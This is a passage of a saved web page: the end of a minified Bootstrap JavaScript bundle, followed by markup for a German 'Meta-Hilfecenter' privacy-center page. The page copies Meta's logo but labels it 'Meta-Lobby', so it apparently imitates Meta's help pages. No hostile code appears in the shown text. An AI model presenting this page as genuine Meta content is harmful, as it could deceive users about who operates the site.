            class Je extends B {
                constructor(t, e) {
                    super(t), this._scrollElement = "BODY" === this._element.tagName ? window : this._element, this._config = this._getConfig(e), this._selector = `${this._config.target} .nav-link, ${this._config.target} .list-group-item, ${this._config.target} .dropdown-item`, this._offsets = [], this._targets = [], this._activeTarget = null, this._scrollHeight = 0, P.on(this._scrollElement, "scroll.bs.scrollspy", () => this._process()), this.refresh(), this._process()
                }
                static get Default() {
                    return Ge
                }
                static get NAME() {
                    return "scrollspy"
                }
                refresh() {
                    const e = this._scrollElement === this._scrollElement.window ? "offset" : "position",
                        i = "auto" === this._config.method ? e : this._config.method,
                        s = "position" === i ? this._getScrollTop() : 0;
                    this._offsets = [], this._targets = [], this._scrollHeight = this._getScrollHeight(), t.find(this._selector).map(e => {
                        const o = n(e),
                            r = o ? t.findOne(o) : null;
                        if (r) {
                            const t = r.getBoundingClientRect();
                            if (t.width || t.height) return [U[i](r).top + s, o]
                        }
                        return null
                    }).filter(t => t).sort((t, e) => t[0] - e[0]).forEach(t => {
                        this._offsets.push(t[0]), this._targets.push(t[1])
                    })
                }
                dispose() {
                    P.off(this._scrollElement, ".bs.scrollspy"), super.dispose()
                }
                _getConfig(t) {
                    if ("string" != typeof (t = {
                        ...Ge,
                        ...U.getDataAttributes(this._element),
                        ..."object" == typeof t && t ? t : {}
                    }).target && r(t.target)) {
                        let {
                            id: i
                        } = t.target;
                        i || (i = e("scrollspy"), t.target.id = i), t.target = "#" + i
                    }
                    return l("scrollspy", t, Ze), t
                }
                _getScrollTop() {
                    return this._scrollElement === window ? this._scrollElement.pageYOffset : this._scrollElement.scrollTop
                }
                _getScrollHeight() {
                    return this._scrollElement.scrollHeight || Math.max(document.body.scrollHeight, document.documentElement.scrollHeight)
                }
                _getOffsetHeight() {
                    return this._scrollElement === window ? window.innerHeight : this._scrollElement.getBoundingClientRect().height
                }
                _process() {
                    const t = this._getScrollTop() + this._config.offset,
                        e = this._getScrollHeight(),
                        i = this._config.offset + e - this._getOffsetHeight();
                    if (this._scrollHeight !== e && this.refresh(), t >= i) {
                        const t = this._targets[this._targets.length - 1];
                        this._activeTarget !== t && this._activate(t)
                    } else {
                        if (this._activeTarget && t < this._offsets[0] && this._offsets[0] > 0) return this._activeTarget = null, void this._clear();
                        for (let e = this._offsets.length; e--;) this._activeTarget !== this._targets[e] && t >= this._offsets[e] && (void 0 === this._offsets[e + 1] || t < this._offsets[e + 1]) && this._activate(this._targets[e])
                    }
                }
                _activate(e) {
                    this._activeTarget = e, this._clear();
                    const i = this._selector.split(",").map(t => `${t}[data-bs-target="${e}"],${t}[href="${e}"]`),
                        n = t.findOne(i.join(","));
                    n.classList.contains("dropdown-item") ? (t.findOne(".dropdown-toggle", n.closest(".dropdown")).classList.add("active"), n.classList.add("active")) : (n.classList.add("active"), t.parents(n, ".nav, .list-group").forEach(e => {
                        t.prev(e, ".nav-link, .list-group-item").forEach(t => t.classList.add("active")), t.prev(e, ".nav-item").forEach(e => {
                            t.children(e, ".nav-link").forEach(t => t.classList.add("active"))
                        })
                    })), P.trigger(this._scrollElement, "activate.bs.scrollspy", {
                        relatedTarget: e
                    })
                }
                _clear() {
                    t.find(this._selector).filter(t => t.classList.contains("active")).forEach(t => t.classList.remove("active"))
                }
                static jQueryInterface(t) {
                    return this.each((function () {
                        const e = Je.getOrCreateInstance(this, t);
                        if ("string" == typeof t) {
                            if (void 0 === e[t]) throw new TypeError(`No method named "${t}"`);
                            e[t]()
                        }
                    }))
                }
            }
            P.on(window, "load.bs.scrollspy.data-api", () => {
                t.find('[data-bs-spy="scroll"]').forEach(t => new Je(t))
            }), _(Je);
            class ti extends B {
                static get NAME() {
                    return "tab"
                }
                show() {
                    if (this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE && this._element.classList.contains("active")) return;
                    let e;
                    const i = s(this._element),
                        n = this._element.closest(".nav, .list-group");
                    if (n) {
                        const i = "UL" === n.nodeName || "OL" === n.nodeName ? ":scope > li > .active" : ".active";
                        e = t.find(i, n), e = e[e.length - 1]
                    }
                    const o = e ? P.trigger(e, "hide.bs.tab", {
                        relatedTarget: this._element
                    }) : null;
                    if (P.trigger(this._element, "show.bs.tab", {
                        relatedTarget: e
                    }).defaultPrevented || null !== o && o.defaultPrevented) return;
                    this._activate(this._element, n);
                    const r = () => {
                        P.trigger(e, "hidden.bs.tab", {
                            relatedTarget: this._element
                        }), P.trigger(this._element, "shown.bs.tab", {
                            relatedTarget: e
                        })
                    };
                    i ? this._activate(i, i.parentNode, r) : r()
                }
                _activate(e, i, n) {
                    const s = (!i || "UL" !== i.nodeName && "OL" !== i.nodeName ? t.children(i, ".active") : t.find(":scope > li > .active", i))[0],
                        o = n && s && s.classList.contains("fade"),
                        r = () => this._transitionComplete(e, s, n);
                    s && o ? (s.classList.remove("show"), this._queueCallback(r, e, !0)) : r()
                }
                _transitionComplete(e, i, n) {
                    if (i) {
                        i.classList.remove("active");
                        const e = t.findOne(":scope > .dropdown-menu .active", i.parentNode);
                        e && e.classList.remove("active"), "tab" === i.getAttribute("role") && i.setAttribute("aria-selected", !1)
                    }
                    e.classList.add("active"), "tab" === e.getAttribute("role") && e.setAttribute("aria-selected", !0), f(e), e.classList.contains("fade") && e.classList.add("show");
                    let s = e.parentNode;
                    if (s && "LI" === s.nodeName && (s = s.parentNode), s && s.classList.contains("dropdown-menu")) {
                        const i = e.closest(".dropdown");
                        i && t.find(".dropdown-toggle", i).forEach(t => t.classList.add("active")), e.setAttribute("aria-expanded", !0)
                    }
                    n && n()
                }
                static jQueryInterface(t) {
                    return this.each((function () {
                        const e = ti.getOrCreateInstance(this);
                        if ("string" == typeof t) {
                            if (void 0 === e[t]) throw new TypeError(`No method named "${t}"`);
                            e[t]()
                        }
                    }))
                }
            }
            P.on(document, "click.bs.tab.data-api", '[data-bs-toggle="tab"], [data-bs-toggle="pill"], [data-bs-toggle="list"]', (function (t) {
                ["A", "AREA"].includes(this.tagName) && t.preventDefault(), h(this) || ti.getOrCreateInstance(this).show()
            })), _(ti);
            const ei = {
                animation: "boolean",
                autohide: "boolean",
                delay: "number"
            },
                ii = {
                    animation: !0,
                    autohide: !0,
                    delay: 5e3
                };
            class ni extends B {
                constructor(t, e) {
                    super(t), this._config = this._getConfig(e), this._timeout = null, this._hasMouseInteraction = !1, this._hasKeyboardInteraction = !1, this._setListeners()
                }
                static get DefaultType() {
                    return ei
                }
                static get Default() {
                    return ii
                }
                static get NAME() {
                    return "toast"
                }
                show() {
                    P.trigger(this._element, "show.bs.toast").defaultPrevented || (this._clearTimeout(), this._config.animation && this._element.classList.add("fade"), this._element.classList.remove("hide"), f(this._element), this._element.classList.add("showing"), this._queueCallback(() => {
                        this._element.classList.remove("showing"), this._element.classList.add("show"), P.trigger(this._element, "shown.bs.toast"), this._maybeScheduleHide()
                    }, this._element, this._config.animation))
                }
                hide() {
                    this._element.classList.contains("show") && (P.trigger(this._element, "hide.bs.toast").defaultPrevented || (this._element.classList.remove("show"), this._queueCallback(() => {
                        this._element.classList.add("hide"), P.trigger(this._element, "hidden.bs.toast")
                    }, this._element, this._config.animation)))
                }
                dispose() {
                    this._clearTimeout(), this._element.classList.contains("show") && this._element.classList.remove("show"), super.dispose()
                }
                _getConfig(t) {
                    return t = {
                        ...ii,
                        ...U.getDataAttributes(this._element),
                        ..."object" == typeof t && t ? t : {}
                    }, l("toast", t, this.constructor.DefaultType), t
                }
                _maybeScheduleHide() {
                    this._config.autohide && (this._hasMouseInteraction || this._hasKeyboardInteraction || (this._timeout = setTimeout(() => {
                        this.hide()
                    }, this._config.delay)))
                }
                _onInteraction(t, e) {
                    switch (t.type) {
                        case "mouseover":
                        case "mouseout":
                            this._hasMouseInteraction = e;
                            break;
                        case "focusin":
                        case "focusout":
                            this._hasKeyboardInteraction = e
                    }
                    if (e) return void this._clearTimeout();
                    const i = t.relatedTarget;
                    this._element === i || this._element.contains(i) || this._maybeScheduleHide()
                }
                _setListeners() {
                    P.on(this._element, "click.dismiss.bs.toast", '[data-bs-dismiss="toast"]', () => this.hide()), P.on(this._element, "mouseover.bs.toast", t => this._onInteraction(t, !0)), P.on(this._element, "mouseout.bs.toast", t => this._onInteraction(t, !1)), P.on(this._element, "focusin.bs.toast", t => this._onInteraction(t, !0)), P.on(this._element, "focusout.bs.toast", t => this._onInteraction(t, !1))
                }
                _clearTimeout() {
                    clearTimeout(this._timeout), this._timeout = null
                }
                static jQueryInterface(t) {
                    return this.each((function () {
                        const e = ni.getOrCreateInstance(this, t);
                        if ("string" == typeof t) {
                            if (void 0 === e[t]) throw new TypeError(`No method named "${t}"`);
                            e[t](this)
                        }
                    }))
                }
            }
            return _(ni), {
                Alert: W,
                Button: q,
                Carousel: Z,
                Collapse: et,
                Dropdown: Ae,
                Modal: De,
                Offcanvas: Ne,
                Popover: Qe,
                ScrollSpy: Je,
                Tab: ti,
                Toast: ni,
                Tooltip: Fe
            }
        }));
    </script><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.26tY-h6gH9w.L.W.O/am=DgY/d=0/rs=AN8SPfowAA8SIQKHJetkAleDuiUL98-5fQ/m=el_main_css"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.26tY-h6gH9w.L.W.O/am=DgY/d=0/rs=AN8SPfowAA8SIQKHJetkAleDuiUL98-5fQ/m=el_main_css"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.26tY-h6gH9w.L.W.O/am=DgY/d=0/rs=AN8SPfowAA8SIQKHJetkAleDuiUL98-5fQ/m=el_main_css"></head>
    <body style="overflow: auto;" class=""><div class="container-sm" id="main">
        <div class="container-head">
            <div id="logo">
                <svg aria-label="Meta-Lobby" class="x1kpxq89 x1247r65" role="img" viewBox="0 0 500 100">
                    <defs>
                        <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH1:" x1="124.38" x2="160.839" y1="99" y2="59.326">
                            <stop offset=".427" stop-color="#0278F1"></stop>
                            <stop offset=".917" stop-color="#0180FA"></stop>
                        </linearGradient>
                        <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH2:" x1="42" x2="-1.666" y1="4.936" y2="61.707">
                            <stop offset=".427" stop-color="#0165E0"></stop>
                            <stop offset=".917" stop-color="#0180FA"></stop>
                        </linearGradient>
                        <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH3:" x1="27.677" x2="132.943" y1="28.71" y2="71.118">
                            <stop stop-color="#0064E0"></stop>
                            <stop offset=".656" stop-color="#0066E2"></stop>
                            <stop offset="1" stop-color="#0278F1"></stop>
                        </linearGradient>
                    </defs>
                    <path d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z" fill="#1C2B33"></path>
                    <path d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z" fill="#0180FA"></path>
                    <path d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z" fill="url(#:R1eckmkldd6knpapd5aqH1:)"></path>
                    <path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z" fill="url(#:R1eckmkldd6knpapd5aqH2:)"></path>
                    <path d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z" fill="url(#:R1eckmkldd6knpapd5aqH3:)"></path>
                </svg>
            </div>
            <div class="burger-button" id="showPopup" style="display: none;">
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
            </div>
        </div>
        <div class="row">
            <div class="col-4" style="display: block;">
                <div id="left">
                    <div id="logo">
                        <svg aria-label="Meta-Lobby" class="" role="img" viewBox="0 0 500 100">
                            <defs>
                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH1:" x1="124.38" x2="160.838" y1="99" y2="59.326">
                                    <stop offset=".427" stop-color="#0278F1"></stop>
                                    <stop offset=".917" stop-color="#0180FA"></stop>
                                </linearGradient>
                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH2:" x1="42" x2="-1.666" y1="4.936" y2="61.707">
                                    <stop offset=".427" stop-color="#0165E0"></stop>
                                    <stop offset=".917" stop-color="#0180FA"></stop>
                                </linearGradient>
                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH3:" x1="27.677" x2="132.943" y1="28.71" y2="71.118">
                                    <stop stop-color="#0064E0"></stop>
                                    <stop offset=".656" stop-color="#0066E2"></stop>
                                    <stop offset="1" stop-color="#0278F1"></stop>
                                </linearGradient>
                            </defs>
                            <path d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z" fill="#1C2B33"></path>
                            <path d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z" fill="#0180FA"></path>
                            <path d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z" fill="url(#:R1eckmkldd6knpapd5aqH1:)"></path>
                            <path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z" fill="url(#:R1eckmkldd6knpapd5aqH2:)"></path>
                            <path d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z" fill="url(#:R1eckmkldd6knpapd5aqH3:)"></path>
                        </svg>
                    </div>
                    <h1><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meta-Hilfecenter</font></font></font></font></font></font></h1>
                    <div id="action-buttons">
                        <div class="action-button account" id="utm-user" style="display: none;">
                            <div class="action-button-img">
                                <svg xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink" version="1.1" width="256" height="256" viewBox="0 0 256 256" xml:space="preserve">
                                    <defs>
                                    </defs>
                                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
                                        <path d="M 45 88 c -11.049 0 -21.18 -2.003 -29.021 -8.634 C 6.212 71.105 0 58.764 0 45 C 0 20.187 20.187 0 45 0 c 24.813 0 45 20.187 45 45 c 0 13.765 -6.212 26.105 -15.979 34.366 C 66.181 85.998 56.049 88 45 88 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(214,214,214); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path>
                                        <path d="M 45 60.71 c -11.479 0 -20.818 -9.339 -20.818 -20.817 c 0 -11.479 9.339 -20.818 20.818 -20.818 c 11.479 0 20.817 9.339 20.817 20.818 C 65.817 51.371 56.479 60.71 45 60.71 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(165,164,164); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path>
                                        <path d="M 45 90 c -10.613 0 -20.922 -3.773 -29.028 -10.625 c -0.648 -0.548 -0.88 -1.444 -0.579 -2.237 C 20.034 64.919 31.933 56.71 45 56.71 s 24.966 8.209 29.607 20.428 c 0.301 0.793 0.069 1.689 -0.579 2.237 C 65.922 86.227 55.613 90 45 90 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(165,164,164); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path>
                                    </g>
                                </svg>
                            </div>
                            <div class="action-button-text UserName">
                            </div>
                            <div class="action-button-arrow">
                            </div>
                        </div>
                        <div class="action-button main collapsed">
                            <div class="action-button-img">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="m19.007 9.997-6.338-5.704a1 1 0 0 0-1.338 0L4.993 9.997A3 3 0 0 0 4 12.227v6.61c0 .216.07.38.149.48a.432.432 0 0 0 .284.167c.86.14 2.04.29 3.567.391V16a3 3 0 0 1 3-3h2a3 3 0 0 1 3 3v3.875a37.895 37.895 0 0 0 3.567-.39.432.432 0 0 0 .284-.168.773.773 0 0 0 .149-.48v-6.61a3 3 0 0 0-.993-2.23zM3.655 8.51l6.338-5.704a3 3 0 0 1 4.014 0l6.338 5.704A5 5 0 0 1 22 12.227v6.61c0 1.292-.836 2.413-2.11 2.621-.94.153-2.208.312-3.833.418-1.125.073-2.057-.836-2.057-1.964V16a1 1 0 0 0-1-1h-2a1 1 0 0 0-1 1v3.912c0 1.128-.932 2.037-2.057 1.964a40.092 40.092 0 0 1-3.832-.418C2.836 21.25 2 20.13 2 18.838v-6.611A5 5 0 0 1 3.655 8.51z">
                                    </path>
                                </svg>
                            </div>
                            <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                Datenschutz-Center-Startseite
                            </font></font></font></font></font></font></div>
                            <div class="action-button-arrow">
                            </div>
                        </div>
                        <div class="action-button collapsed" id="search">
                            <div class="action-button-img">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M16.618 18.032a9 9 0 1 1 1.414-1.414l3.675 3.675a1 1 0 0 1-1.414 1.414l-3.675-3.675zM18 11a7 7 0 1 1-14 0 7 7 0 0 1 14 0z">
                                    </path>
                                </svg>
                            </div>
                            <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                Suchen
                            </font></font></font></font></font></font></div>
                        </div>
                        <div class="action-button collapsed" id="Policy" data-bs-toggle="collapse" data-bs-target="#PolicyCollapse" aria-expanded="false" aria-controls="PolicyCollapse">
                            <div class="action-button-img">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
                                    <path d="M12 12a2 2 0 0 1 1 3.732V17a1 1 0 1 1-2 0v-1.268A2 2 0 0 1 12 12z"></path>
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M7 6a5 5 0 0 1 10 0v2h.857c1.282 0 2.417.818 2.664 2.076A25.71 25.71 0 0 1 21 15a25.71 25.71 0 0 1-.479 4.924C20.274 21.182 19.14 22 17.857 22H6.143c-1.282 0-2.417-.818-2.664-2.076A25.711 25.711 0 0 1 3 15c0-1.984.236-3.692.479-4.924C3.726 8.818 4.86 8 6.143 8H7V6zm8 0v2H9V6a3 3 0 1 1 6 0zm-8.857 4h11.714a.84.84 0 0 1 .508.157c.107.082.17.182.194.305.223 1.133.441 2.71.441 4.538 0 1.828-.218 3.405-.441 4.538a.488.488 0 0 1-.194.305.84.84 0 0 1-.508.157H6.143a.84.84 0 0 1-.508-.157.489.489 0 0 1-.194-.305A23.712 23.712 0 0 1 5 15c0-1.828.218-3.405.441-4.538a.489.489 0 0 1 .194-.305.84.84 0 0 1 .508-.157z">
                                    </path>
                                </svg>
                            </div>
                            <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                Datenschutzrichtlinie
                            </font></font></font></font></font></font></div>
                            <div class="action-button-arrow">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class="ARROW">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M4.341 7.247a1 1 0 0 1 1.412.095L12 14.482l6.247-7.14a1 1 0 0 1 1.506 1.317l-7 8a1 1 0 0 1-1.506 0l-7-8a1 1 0 0 1 .095-1.412z">
                                    </path>
                                </svg>
                            </div>
                        </div>
                        <div class="collapse" id="PolicyCollapse" style="">
                        <div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
